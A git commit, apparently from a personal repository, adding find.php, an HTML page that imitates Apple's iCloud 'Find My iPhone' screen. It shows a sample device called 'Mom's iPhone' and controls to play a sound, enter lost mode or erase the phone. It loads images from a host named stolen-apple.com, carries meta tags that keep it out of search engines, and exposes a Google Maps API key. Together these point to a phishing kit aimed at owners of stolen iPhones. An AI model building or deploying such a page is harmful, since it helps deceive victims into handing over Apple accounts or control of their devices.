e0be3d0a0b83a06ba2d71cb20beb14a55a69e498
kushy <kushypro@gmail.com>
2020-12-24 00:18:28 +0700

    Add files via upload

---
+++ README.md
@@ -0,0 +1,2 @@
+# icloud
+my icloud
---
+++ find.php
@@ -0,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	
+	<meta charset="UTF-8">
+	<meta name="robots" content="noindex, nofollow, noarchive" />
+	<meta name="googlebot" content="noindex, nofollow, noarchive">
+	<meta name="googlebot" content="nosnippet" />
+	<meta name="robots" content="noodp" />
+	<meta name="slurp" content="noydir">
+	<meta name="robots" content="noimageindex,nomediaindex" />
+	<meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta content="width=device-width, initial-scale=1" name="viewport"/>
+		<link rel="shortcut icon" href="assets/img/favicon.ico">
+    <link rel="apple-touch-icon" sizes="57x57" href="/assets/favicon/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="/assets/favicon/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="/assets/favicon/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="/assets/favicon/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="/assets/favicon/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="/assets/favicon/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="/assets/favicon/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/assets/favicon/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="/assets/favicon/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">
+    <link rel="manifest" href="/assets/favicon/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/assets/favicon/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+	<title>iCloud - Find My iPhone</title>
+	<link rel="stylesheet" href="/assets/layout/strap.css">
+	<link rel="stylesheet" href="/assets/layout/apple.css">
+	<link rel="stylesheet" href="/assets/layout/kit.css">
+	<link rel="stylesheet" href="/assets/layout/animate.css">
+	<script src="/assets/js/jquery.js"></script>
+</head>
+<body class="find robots-nocontent">
+
+<section id="header2">
+
+				<a class="allDevices"><span>All Devices</span><i class="glyphicon glyphicon-menu-down"></i>
+					<div class="getDevice">
+					<div class="deviceBody">
+					<ul>
+						<li class="active" 
+													data-name="All Devices">
+							<div class="imga">
+								<img src="/assets/img/devices/alldevice.png" alt="">
+							</div>
+							<div class="namea">
+								All Devices							</div>
+						</li>
+						
+								<li data-id="deviceID5" data-name="Mom's iPhone">
+									<div class="imgs">
+									<img src="" class="icon device-online">
+									</div>
+									<div class="imgd">
+										<img src="http://stolen-apple.com/assets/img/devices/iPhone7,2ob.png" class="icon device-online">
+									</div>
+									<div class="named">Mom's iPhone</div>
+									<div class="agod">
+										1 hour ago
+									</div>
+								</li>					</ul>
+					</div>
+					</div>
+				</a>
+
+	<div class="container-fluid">
+		<div class="row">
+			<div class="col-md-4 col-xs-8 rightH rtl">
+				<a class="help" title="Help and Support" alt="Help and Support" href="https://help.apple.com/icloud/"></a>
+				<a class="logout" title="Sign Out" alt="Sign Out" href="/"></a>
+				<span class="spreat"></span>
+				<div class="setup fName" style="display: block;"><i class="glyphicon glyphicon-menu-down"></i><span>Mom's iPhone</span>
+					<ul>
+						<li><a href="/">iCloud Settings</a></li>
+						<li><a href="/">Sign Out</a></li>
+					</ul>
+				</div>
+
+			</div>
+			<div class="col-md-8 col-xs-4 leftH">
+				<span class="icloud"></span><span class="find hidden-sm hidden-xs hidden-md">Find My iPhone</span>
+
+			</div>
+		</div>
+	</div>
+</section>
+
+<script src="http://maps.googleapis.com/maps/api/js?key=AIzaSyDoqzcKrNPa8CzSeRPv8g7Q4mODVrjPizU" type="text/javascript"></script>
+<section id="compass">
+	<div class="compass">
+		<img src="/assets/img/compass1.png" class="compass1" alt="">
+		<img src="/assets/img/compass2.png" class="compass2" alt="">
+		<img src="/assets/img/compass3.png" class="compass3" alt="">
+		<span>Locating...</span>
+	</div>
+	<div class="clearfix"></div>
+</section>
+<div class="findBody">
+
+
+
+
+<section id="findmap5" class="findmap ltr shows">
+
+<div class="container">
+	<div class="row">
+		<div class="col-md-12 col-xs-12">
+			<div class="deviceOffline">
+				<img src="http://stolen-apple.com/assets/img/devices/info/iPhone7,2ob.png" class="icon device-online">
+				<h2>Mom's iPhone</h2>
+				<p>Offline</p>
+
+				<div class="dline"></div>
+
+				<div class="dnoti">
+					<input type="checkbox">
+					Notify me when found				</div>
+
+				<div class="dline"></div>
+
+				<div class="devicemenu">
+					<div class="deviceAction" data-id="Xm2woNTEo05sOx+fJ0bi0i/QGOZAGjCUXxBcYjNB1obNY8MNBfnnrOHYVNSUzmWV" data-url="http://index.php/respons/playsound/">
+						<img class="getRes playsound" src="/assets/img/playso.png" alt="">
+						<img class="loadingAction" src="/assets/img/ajax-loader.gif" alt="Loading" />
+						<span>Play Sound</span>
+					</div>
+					<div class="deviceAction" data-id="Xm2woNTEo05sOx+fJ0bi0i/QGOZAGjCUXxBcYjNB1obNY8MNBfnnrOHYVNSUzmWV" data-url="http://index.php/respons/lostmode/">
+						<img class="getRes lostmode" src="/assets/img/packed-3_033.png" alt="">
+						<img class="loadingAction" src="/assets/img/ajax-loader.gif" alt="Loading" />
+						<span>Lost Mode</span>
+					</div>
+					<div class="deviceAction" data-id="Xm2woNTEo05sOx+fJ0bi0i/QGOZAGjCUXxBcYjNB1obNY8MNBfnnrOHYVNSUzmWV" data-url="http://index.php/respons/erasemode/">
+						<img class="getRes erasemode" src="/assets/img/packed-3_07.png" alt="">
+						<img class="loadingAction" src="/assets/img/ajax-loader.gif" alt="Loading" />
+						<span>Erase iPhone</span>
+					</div>
+				</div>
+
+				<div class="dline"></div>
+
+				<a href="#" class="dremove">Remove from Account</a>
+
+				<div class="dline"></div>
+
+			</div>
+		</div>
+	</div>
+</div>
+
+</section>
+<script>
+	$(document).ready(function() {
+		$('.deviceBody ul li[data-id="deviceID5"]').on('click', function() {
+
+	  if ( $("#findmap5").hasClass('shows') ) {
+
+	  } else {
+	  	$("#findmap5").addClass('shows', 500).siblings().removeClass('shows', 500);
+	  	 initialize();
+		}
+
+		if ( $("#findmaps5").hasClass('shows') ) {
+
+	  } else {
+	  	$("#findmaps5").addClass('shows', 500).siblings().removeClass('shows', 500);
+	  	 initialize();
+		}
+
+		});
+	});
+</script>
+</div>
+<script>
+	$(document).ready(function() {
+		$('.deviceBody ul li[data-id="deviceID0"]').on('click', function() {
+
+	  if ( $("#findmap0").hasClass('shows') ) {
+
+	  } else {
+	  	$("#findmap0").addClass('shows', 500).siblings().removeClass('shows', 500);
+		}
+
+		});
+	});
+</script>	<script src="/assets/js/apple.min.js"></script>
+	<script src="/assets/js/mapiconmaker.js"></script>
+	<script src="/assets/js/ajax-form.min.js"></script>
+
+	<script type="text/javascript">
+
+	$(document).ready(function() {
+
+		
+		setTimeout(function(){
+			$('#compass').fadeOut(100);
+		},5000);
+	});
+	</script>
+</body>
+</html>
